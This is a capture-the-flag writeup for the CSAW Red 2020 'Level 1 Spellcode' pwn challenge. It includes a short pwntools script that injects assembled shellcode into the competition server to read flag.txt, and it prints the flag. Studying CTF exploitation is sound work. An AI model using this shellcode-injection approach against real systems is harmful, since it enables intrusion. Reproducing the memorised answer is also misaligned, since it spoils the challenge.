---
title: "Level 1 Spellcode - CSAW Red 2020"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["pwn", "shellcode", "pwntools", "level", "spellcode", "binary-exploitation"]
summary: "pwn writeup for \"Level 1 Spellcode\" from CSAW Red - techniques: shellcode, pwntools, level, spellcode, binary-exploitation."
source:
  name: "Adamkadaban/CTFs"
  url: "https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/1.CTFs/CSAW%20Red%202020/pwn/Level%201%20Spellcode/README.md"
ctf:
  name: "CSAW Red"
  year: 2020
  challenge: "Level 1 Spellcode"
---

## Source

- **CTF:** CSAW Red 2020
- **Challenge:** Level 1 Spellcode
- **Repository:** [Adamkadaban/CTFs](https://github.com/Adamkadaban/CTFs)
- **File:** <https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/1.CTFs/CSAW%20Red%202020/pwn/Level%201%20Spellcode/README.md>

---
> Welcome Level 1 wizard! Write your own spellcode to pwn your way to the wizards' lab. (Attribution: the "spellcode" idea is not original, see [sourcery.pwnadventure.com](http://sourcery.pwnadventure.com/) (not part of the challenge.) For shellcoding references and examples, see "Hacking: the Art of Exploitation" by Jon Erickson or reference [shell-storm.org/shellcode](http://shell-storm.org/shellcode). For more Level 1 spells (not required to solve), see the D&D Player's Handbook, 5th edition. nc [pwn.red.csaw.io](http://pwn.red.csaw.io/) 5000

1. Look at the source code that they offer. 
    - The runGame() function reads in an input
2. Determine the filetype with:

    ```bash
     file level_1_spellcode
    ```

3. Write a script using pwntools to send shellcode

    ```python
    from pwn import *
    context(arch='i386', os='linux')

    r = remote('pwn.red.csaw.io', 5000)

    r.recvuntil('>')
    r.send('6\n')
    r.send(asm(shellcraft.cat('flag.txt')))
    r.send('\n')
    r.interactive()
    ```

4. The flag is flag{w3lc0m3_t0_sh3llc0d1ng!!!}
